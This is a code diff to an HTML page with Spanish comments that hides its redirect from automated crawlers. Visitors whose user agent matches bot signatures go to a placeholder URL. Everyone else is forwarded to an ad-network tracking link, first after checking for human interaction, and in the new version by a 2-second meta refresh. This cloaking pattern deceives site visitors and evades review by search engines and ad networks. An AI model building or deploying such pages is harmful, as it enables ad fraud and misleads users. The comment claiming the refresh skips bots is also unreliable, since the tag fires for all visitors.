@@ -18,57 +18,18 @@
             return botUserAgents.some(bot => userAgent.includes(bot));
         }
 
-        // Función para detectar interacción humana
-        function hasHumanInteraction() {
-            return new Promise((resolve) => {
-                let interacted = false;
-
-                // Detectar interacción con el mouse, scroll, teclado o eventos táctiles
-                function onUserInteraction() {
-                    interacted = true;
-                    clearTimeout(timeout);  // Limpiar el timeout si hay interacción
-                    resolve(interacted);  // Resolver la promesa si hay interacción
-                }
-
-                // Timeout de 2 segundos, si no hay interacción asumimos que es un bot
-                const timeout = setTimeout(() => {
-                    resolve(interacted);  // Si no hay interacción, resolvemos con "false"
-                }, 2000); // Después de 2 segundos sin interacción, se supone que es un bot
-
-                // Escuchar interacciones del usuario
-                document.addEventListener("mousemove", onUserInteraction);
-                document.addEventListener("scroll", onUserInteraction);
-                document.addEventListener("keydown", onUserInteraction);
-                document.addEventListener("touchstart", onUserInteraction);  // Detectar interacción táctil
-                document.addEventListener("touchmove", onUserInteraction);   // Detectar desplazamiento táctil
-                document.addEventListener("touchend", onUserInteraction);    // Detectar finalización de toque
-            });
+        // Si es un bot, redirigir a una página vacía
+        if (isBot()) {
+            window.location.replace("https://www.ejemplo.com/");  // Cambia esto por la URL a la que deseas redirigir los bots
         }
-
-        // Redirigir solo si el tráfico es humano
-        async function handleTraffic() {
-            if (isBot()) {
-                // Si es un bot, redirigir a una página vacía
-                window.location.replace("about:blank");
-            } else {
-                // Esperar 2 segundos para detectar interacción humana
-                const interacted = await hasHumanInteraction();
-                if (interacted) {
-                    // Si hubo interacción humana, permitir la redirección
-                    window.location.replace("https://www.effectiveratecpm.com/yzmvq78n?key=8ecb5d166f3c46a6bd52bb278155058f");
-                } else {
-                    // Si no hubo interacción humana, redirigir a una página vacía
-                    window.location.replace("about:blank");
-                }
-            }
-        }
-
-        // Ejecutar la función para manejar el tráfico al cargar la página
-        window.onload = handleTraffic;
     </script>
+
+    <!-- Meta refresh para redirigir después de 2 segundos (solo si no es un bot) -->
+    <meta http-equiv="refresh" content="2;url=https://www.effectiveratecpm.com/yzmvq78n?key=8ecb5d166f3c46a6bd52bb278155058f">
 </head>
 <body>
-    <!-- El contenido de la página será redirigido solo después de verificar el tráfico -->
+    <!-- El contenido de la página será redirigido después de 2 segundos si no es un bot -->
 </body>
 </html>
+
 
